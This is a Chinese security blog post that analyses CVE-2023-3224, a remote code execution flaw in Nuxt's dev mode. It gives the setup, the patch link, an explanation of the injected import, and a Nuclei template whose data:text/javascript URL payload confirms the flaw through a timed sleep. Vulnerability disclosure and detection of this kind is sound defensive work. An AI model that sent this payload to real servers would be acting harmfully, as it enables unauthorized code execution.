---
title: CVE-2023-3224 Nuxt dev mode rce
url: https://y4er.com/posts/cve-2023-3224-nuxt-dev-mode-rce/
source: Y4er的博客
date: 2023-06-21
fetch_date: 2025-10-04T11:44:25.633850
---

# CVE-2023-3224 Nuxt dev mode rce

[Y4er的博客](/ "Y4er的博客")

[归档](/posts/) [专栏](/series/) [分类](/categories/) [标签](/tags/) [笔记](/note/) [朋友](/friends/) [作品](/showcase/)

浅色深色跟随系统

[Y4er的博客](/ "Y4er的博客")

取消

[归档](/posts/)[专栏](/series/)[分类](/categories/)[标签](/tags/)[笔记](/note/)[朋友](/friends/)[作品](/showcase/)

浅色深色跟随系统

## 目录

* [环境](#环境)
* [补丁](#补丁)
* [分析](#分析)
* [poc](#poc)
* [参考](#参考)

## 目录

* [环境](#环境)
* [补丁](#补丁)
* [分析](#分析)
* [poc](#poc)
* [参考](#参考)

# CVE-2023-3224 Nuxt dev mode rce

![Y4er avatar](/img/avatar.jpg)[Y4er](https://github.com/Y4er "Author")
 收录于  类别 [代码审计](/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/)

2023-06-20  2023-06-20  约 666 字
 预计阅读 3 分钟

目录

* [环境](#环境)
* [补丁](#补丁)
* [分析](#分析)
* [poc](#poc)
* [参考](#参考)

警告

本文最后更新于 2023-06-20，文中内容可能已过时。

# # 环境

<https://nuxt.com/docs/examples/essentials/hello-world>

照着这个创建文件，然后修改package.json里nuxt的版本号

json

```
{
  "name": "example-hello-world",
  "private": true,
  "scripts": {
    "build": "nuxi build",
    "dev": "nuxi dev",
    "start": "nuxi preview"
  },
  "devDependencies": {
    "nuxt": "3.5.0"
  }
}
```

# # 补丁

<https://github.com/nuxt/nuxt/commit/65a8f4eb3ef1b249a95fd59e323835a96428baff>

# # 分析

[![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/31adaf9c-6ec7-45fe-9073-04f90c79b783.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/31adaf9c-6ec7-45fe-9073-04f90c79b783.png "image.png")

image.png

如果服务器以dev模式运行并且请求的url以`/__nuxt_component_test__/`开头，那么引入`#build/test-component-wrapper.mjs`

在`#build/test-component-wrapper.mjs`中会截取query string然后import，造成rce。

poc

[![e19287aaa92efc6f11df05e0aed51979.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/48d9b26c-637b-76f3-4ed8-bf1076ec65c2.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/48d9b26c-637b-76f3-4ed8-bf1076ec65c2.png "e19287aaa92efc6f11df05e0aed51979.png")

e19287aaa92efc6f11df05e0aed51979.png

当引入child\_process执行命令时，报错500

[![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/421491f8-1773-d615-7a93-ae98a6e1f7a8.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/421491f8-1773-d615-7a93-ae98a6e1f7a8.png "image.png")

image.png

这个时候需要用`node_modules`里别的gadget。

# # poc

编写模板时，要考虑怎么做验证，有的没办法执行命令，干脆用sleep延时来判断，然后发现nuxt在渲染时有缓存，如果两次payload一致时只会sleep一次，所以加了个随机数。

yaml

```
id: CVE-2023-3224

info:
  name: nuxt developer mode RCE
  author: Y4er
  severity: critical
  description: |
    RCE in developer mode in nuxt/nuxt
  reference:
    - https://huntr.dev/bounties/1eb74fd8-0258-4c1f-a904-83b52e373a87/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    cve-id: CVE-2023-3224
    cwe-id: CWE-94
  tags: cve,cve2023,rce,http,vmware

http:
  - method: GET
    path:
      - "{{BaseURL}}/__nuxt_component_test__/?path=data:text/javascript,await%20new%20Promise(resolve%20=%3E%20setTimeout(resolve,%206000));console.log('{{randstr}}')"

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'
```

# # 参考

<https://huntr.dev/bounties/1eb74fd8-0258-4c1f-a904-83b52e373a87/>

文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。

![](/img/avatar.jpg)

*如果你觉得这篇文章对你有所帮助，欢迎赞赏或关注微信公众号～*

![](/img/reward/wechat.png)![](/img/reward/alipay.png)![](/img/reward/weixin_mp.jpg)

更新于 2023-06-20

LINE

[CVE](/tags/cve/), [Nuxt](/tags/nuxt/)

返回 | [主页](/)

[VMware VRealize Network Insight 命令注入和目录穿越及补丁绕过](/posts/vmware-vrealize-network-insight-command-inject-and-directory-traversal/ "VMware VRealize Network Insight 命令注入和目录穿越及补丁绕过")
[CVE-2023-38646 Metabase pre-auth rce](/posts/cve-2023-38646-metabase-pre-auth-rce/ "CVE-2023-38646 Metabase pre-auth rce")

Please enable JavaScript to view the comments powered by [Utterances](https://utteranc.es/).

由 [Hugo](https://gohugo.io/ "Hugo 0.148.2") 强力驱动 | 托管在 [Cloudflare Pages](https://pages.cloudflare.com/ "Cloudflare Pages") 上 | 主题 -  [DoIt](https://github.com/HEIGE-PCloud/DoIt "DoIt 0.4.2")

2018 - 2025 [Y4er](https://github.com/Y4er) | [CC BY-NC 4.0](https://creativecommons.org/licenses/by-nc/4.0/)